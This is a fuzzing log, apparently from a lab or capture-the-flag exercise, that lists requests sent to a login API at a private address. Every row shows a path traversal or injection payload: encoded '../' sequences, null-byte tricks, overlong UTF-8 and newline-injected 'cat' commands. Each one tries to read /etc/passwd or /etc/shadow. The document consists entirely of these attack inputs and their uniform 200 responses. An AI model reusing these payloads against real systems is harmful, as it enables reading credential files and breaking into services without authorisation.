Target: http://10.10.10.16/api/login
Total requests: 468
==============================================================================================================================================
ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Payload    
==============================================================================================================================================
00099:  0.051s   C=00099:  C=200      0 L	       2 W	     21 Ch                                                                              "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
00097:  0.051s   C=00097:  C=200      0 L	       2 W	     21 Ch                                                                              "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"
00094:  0.051s   C=00094:  C=200      0 L	       2 W	     21 Ch                                                                              "%00../../../../../../etc/shadow"
00102:  0.051s   C=00102:  C=200      0 L	       2 W	     21 Ch                                                                              "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
00096:  0.051s   C=00096:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../../etc/passwd%00.html"
00101:  0.051s   C=00101:  C=200      0 L	       2 W	     21 Ch                                                                              "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
00092:  0.051s   C=00092:  C=200      0 L	       2 W	     21 Ch                                                                              "%00/etc/shadow%00"
00091:  0.051s   C=00091:  C=200      0 L	       2 W	     21 Ch                                                                              "%00/etc/passwd%00"
00090:  0.051s   C=00090:  C=200      0 L	       2 W	     21 Ch                                                                              "%0a/bin/cat%20/etc/shadow"
00083:  0.051s   C=00083:  C=200      0 L	       2 W	     21 Ch                                                                              ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd"
00087:  0.051s   C=00087:  C=200      0 L	       2 W	     21 Ch                                                                              "..\..\..\..\..\..\..\..\..\..\etc\passwd%00"
00089:  0.051s   C=00089:  C=200      0 L	       2 W	     21 Ch                                                                              "%0a/bin/cat%20/etc/passwd"
